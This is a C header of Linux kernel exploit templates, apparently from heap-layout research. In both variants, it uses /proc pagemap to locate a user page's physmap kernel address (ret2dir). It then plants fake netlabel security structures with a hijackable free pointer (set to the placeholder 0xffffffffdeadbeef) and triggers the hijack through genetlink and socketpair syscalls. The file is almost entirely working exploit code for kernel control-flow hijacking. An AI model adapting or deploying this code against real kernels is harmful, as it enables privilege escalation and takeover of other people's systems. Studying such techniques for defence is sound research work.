#ifndef _TTY_PRIVATE_FILE_TMPL_H_
#define _TTY_PRIVATE_FILE_TMPL_H_

#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <memory.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/socket.h>
#include <linux/genetlink.h>
#include <linux/netlink.h>

#define KMALLOC_SIZE 32

// for ret2dir
#define PHYS_OFFSET 0xffff880000000000
#define PFN_MIN 0
#define PAGE_SIZE 0x1000
#define USER_ADDR 0x40000000
#define PAGE_SHIFT 12

#ifdef FENGSHUI1

struct sk_security_struct {
	char hole1[0x8];
	char* nlbl_secattr;
    char hole2[0x10];
};

struct netlbl_lsm_secattr {
	unsigned flags;
	char hole1[0xc];
	char* cache;
	char hole2[0x18];
};

struct netlbl_lsm_cache {
	unsigned long refcount;
	char* free;
	char hole2[0x8];
};

struct sk_security_struct fake_sk_security_struct;
struct netlbl_lsm_secattr fake_netlbl_lsm_secattr;
struct netlbl_lsm_cache fake_netlbl_lsm_cache;

unsigned overwrite_start = 0x8;
unsigned overwrite_end = 0x10;

void* victim_obj = (void*)&fake_sk_security_struct;

uint64_t kaddr = 0x0;

void do_setup_physmap() {

    void* uaddr = (void*)USER_ADDR;
    void* raddr = NULL;
    void* ret = NULL;
    char file_name[30];
    sprintf(file_name, "/proc/%d/pagemap", getpid());
    int fd = open(file_name, O_RDONLY);
    if (fd < 0) {
        perror("open failed");
        goto err;
    }
    uint64_t v = 0;
    uint64_t pfn = 0;

    munmap(uaddr, PAGE_SIZE);
    raddr = mmap(uaddr, PAGE_SIZE, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, -1, 0);
    if(raddr == MAP_FAILED) {
        perror("mmap failed");
        goto err;
    }
    // necessary due to lazy allocation
    memset(raddr, 0, PAGE_SIZE);
    lseek(fd, ((uint64_t)uaddr >> PAGE_SHIFT)*sizeof(uint64_t), SEEK_SET);
    read(fd, &v, sizeof(uint64_t));
    if (v & (1UL << 63)) {
        pfn = v & ((1UL << 55) - 1);
        fprintf(stdout, "pfn: 0x%lx\n", pfn);
        kaddr = PHYS_OFFSET + 0x1000 * (pfn-PFN_MIN);
        fprintf(stdout, "kaddr: 0x%lx\n", kaddr);
        ret = (void*)kaddr;

        memset(&fake_sk_security_struct, 0x00, sizeof(struct sk_security_struct));
        fake_sk_security_struct.nlbl_secattr = (void*)kaddr;

        memset(&fake_netlbl_lsm_secattr, 0x00, sizeof(struct netlbl_lsm_secattr));
		fake_netlbl_lsm_secattr.flags = 0x00000002;
		fake_netlbl_lsm_secattr.cache  = (void*)(kaddr+sizeof(struct netlbl_lsm_secattr));

        memset(&fake_netlbl_lsm_cache, 0x00, sizeof(struct netlbl_lsm_cache));
		fake_netlbl_lsm_cache.refcount = 0x1;
        fake_netlbl_lsm_cache.free = (void*)0xffffffffdeadbeef;

        memset((void*)USER_ADDR, 0x00, PAGE_SIZE);
        memcpy((void*)USER_ADDR, &fake_netlbl_lsm_secattr, sizeof(struct netlbl_lsm_secattr));
        memcpy((void*)(USER_ADDR+sizeof(struct netlbl_lsm_secattr)), &fake_netlbl_lsm_cache, sizeof(struct netlbl_lsm_cache));

    }
    return;
err:
    close(fd);
    exit(-1);
}

static long syz_genetlink_get_family_id(long name)
{
  char buf[512] = {0};
  struct nlmsghdr* hdr = (struct nlmsghdr*)buf;
  struct genlmsghdr* genlhdr = (struct genlmsghdr*)NLMSG_DATA(hdr);
  struct nlattr* attr = (struct nlattr*)(genlhdr + 1);
  hdr->nlmsg_len =
      sizeof(*hdr) + sizeof(*genlhdr) + sizeof(*attr) + GENL_NAMSIZ;
  hdr->nlmsg_type = GENL_ID_CTRL;
  hdr->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
  genlhdr->cmd = CTRL_CMD_GETFAMILY;
  attr->nla_type = CTRL_ATTR_FAMILY_NAME;
  attr->nla_len = sizeof(*attr) + GENL_NAMSIZ;
  strncpy((char*)(attr + 1), (char*)name, GENL_NAMSIZ);
  struct iovec iov = {hdr, hdr->nlmsg_len};
  struct sockaddr_nl addr = {0};
  addr.nl_family = AF_NETLINK;
  int fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_GENERIC);
  if (fd == -1) {
    return -1;
  }
  struct msghdr msg = {&addr, sizeof(addr), &iov, 1, NULL, 0, 0};
  if (sendmsg(fd, &msg, 0) == -1) {
    close(fd);
    return -1;
  }
  ssize_t n = recv(fd, buf, sizeof(buf), 0);
  close(fd);
  if (n <= 0) {
    return -1;
  }
  if (hdr->nlmsg_type != GENL_ID_CTRL) {
    return -1;
  }
  for (; (char*)attr < buf + n;
       attr = (struct nlattr*)((char*)attr + NLMSG_ALIGN(attr->nla_len))) {
    if (attr->nla_type == CTRL_ATTR_FAMILY_ID)
      return *(uint16_t*)(attr + 1);
  }
  return -1;
}

void do_alloc_victim() {
  syscall(__NR_mmap, 0x20000000, 0x1000000, 3, 0x32, -1, 0);
  long res = 0;
  memcpy((void*)0x20000280, "nbd", 4);
  res = syz_genetlink_get_family_id(0x20000280);
}

void do_hijack() {
	syscall(__NR_socketpair, 2, 2, 0x88, 0x20001440);
}

#endif // FENGSHUI1

#ifdef FENGSHUI4

struct sk_security_struct {
	char hole1[0x8];
	char* nlbl_secattr;
    char hole2[0x10];
};

struct netlbl_lsm_secattr {
	unsigned flags;
	char hole1[0xc];
	char* cache;
	char hole2[0x18];
};

struct netlbl_lsm_cache {
	unsigned long refcount;
	char* free;
	char hole2[0x8];
};

struct sk_security_struct fake_sk_security_struct;
struct netlbl_lsm_secattr fake_netlbl_lsm_secattr;
struct netlbl_lsm_cache fake_netlbl_lsm_cache;

unsigned overwrite_start = 0x0;
unsigned overwrite_end = 0x8;

void* victim_obj = (void*)&fake_sk_security_struct;

uint64_t kaddr = 0x0;

void do_setup_physmap() {

    void* uaddr = (void*)USER_ADDR;
    void* raddr = NULL;
    void* ret = NULL;
    char file_name[30];
    sprintf(file_name, "/proc/%d/pagemap", getpid());
    int fd = open(file_name, O_RDONLY);
    if (fd < 0) {
        perror("open failed");
        goto err;
    }
    uint64_t v = 0;
    uint64_t pfn = 0;

    munmap(uaddr, PAGE_SIZE);
    raddr = mmap(uaddr, PAGE_SIZE, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, -1, 0);
    if(raddr == MAP_FAILED) {
        perror("mmap failed");
        goto err;
    }
    // necessary due to lazy allocation
    memset(raddr, 0, PAGE_SIZE);
    lseek(fd, ((uint64_t)uaddr >> PAGE_SHIFT)*sizeof(uint64_t), SEEK_SET);
    read(fd, &v, sizeof(uint64_t));
    if (v & (1UL << 63)) {
        pfn = v & ((1UL << 55) - 1);
        fprintf(stdout, "pfn: 0x%lx\n", pfn);
        kaddr = PHYS_OFFSET + 0x1000 * (pfn-PFN_MIN);
        fprintf(stdout, "kaddr: 0x%lx\n", kaddr);
        ret = (void*)kaddr;

        memset(&fake_sk_security_struct, 0x00, sizeof(struct sk_security_struct));
        fake_sk_security_struct.nlbl_secattr = (void*)(kaddr + 
												sizeof(struct sk_security_struct));

        memset(&fake_netlbl_lsm_secattr, 0x00, sizeof(struct netlbl_lsm_secattr));
		fake_netlbl_lsm_secattr.flags = 0x00000002;
		fake_netlbl_lsm_secattr.cache  = (void*)(kaddr + 
												sizeof(struct sk_security_struct) +
												sizeof(struct netlbl_lsm_secattr));

        memset(&fake_netlbl_lsm_cache, 0x00, sizeof(struct netlbl_lsm_cache));
		fake_netlbl_lsm_cache.refcount = 0x1;
        fake_netlbl_lsm_cache.free = (void*)0xffffffffdeadbeef;

        memset((void*)USER_ADDR, 0x00, PAGE_SIZE);
        memcpy((void*)USER_ADDR + 
				sizeof(struct sk_security_struct), 
				&fake_netlbl_lsm_secattr, sizeof(struct netlbl_lsm_secattr));

        memcpy((void*)(USER_ADDR + 
				sizeof(struct sk_security_struct) + 
				sizeof(struct netlbl_lsm_secattr)), 
				&fake_netlbl_lsm_cache, sizeof(struct netlbl_lsm_cache));

    }
    return;
err:
    close(fd);
    exit(-1);
}

static long syz_genetlink_get_family_id(long name)
{
  char buf[512] = {0};
  struct nlmsghdr* hdr = (struct nlmsghdr*)buf;
  struct genlmsghdr* genlhdr = (struct genlmsghdr*)NLMSG_DATA(hdr);
  struct nlattr* attr = (struct nlattr*)(genlhdr + 1);
  hdr->nlmsg_len =
      sizeof(*hdr) + sizeof(*genlhdr) + sizeof(*attr) + GENL_NAMSIZ;
  hdr->nlmsg_type = GENL_ID_CTRL;
  hdr->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
  genlhdr->cmd = CTRL_CMD_GETFAMILY;
  attr->nla_type = CTRL_ATTR_FAMILY_NAME;
  attr->nla_len = sizeof(*attr) + GENL_NAMSIZ;
  strncpy((char*)(attr + 1), (char*)name, GENL_NAMSIZ);
  struct iovec iov = {hdr, hdr->nlmsg_len};
  struct sockaddr_nl addr = {0};
  addr.nl_family = AF_NETLINK;
  int fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_GENERIC);
  if (fd == -1) {
    return -1;
  }
  struct msghdr msg = {&addr, sizeof(addr), &iov, 1, NULL, 0, 0};
  if (sendmsg(fd, &msg, 0) == -1) {
    close(fd);
    return -1;
  }
  ssize_t n = recv(fd, buf, sizeof(buf), 0);
  close(fd);
  if (n <= 0) {
    return -1;
  }
  if (hdr->nlmsg_type != GENL_ID_CTRL) {
    return -1;
  }
  for (; (char*)attr < buf + n;
       attr = (struct nlattr*)((char*)attr + NLMSG_ALIGN(attr->nla_len))) {
    if (attr->nla_type == CTRL_ATTR_FAMILY_ID)
      return *(uint16_t*)(attr + 1);
  }
  return -1;
}

extern void do_defragment();
void do_alloc_step() {
    do_defragment(KMALLOC_SIZE, 1);
}

void do_alloc_victim() {
  do_alloc_step();
  syscall(__NR_mmap, 0x20000000, 0x1000000, 3, 0x32, -1, 0);
  long res = 0;
  memcpy((void*)0x20000280, "nbd", 4);
  res = syz_genetlink_get_family_id(0x20000280);
}

void do_hijack() {
  memcpy((void*)(USER_ADDR), 
				&fake_sk_security_struct, sizeof(struct sk_security_struct));
  syscall(__NR_socketpair, 2, 2, 0x88, 0x20001440);
}

#endif


#endif
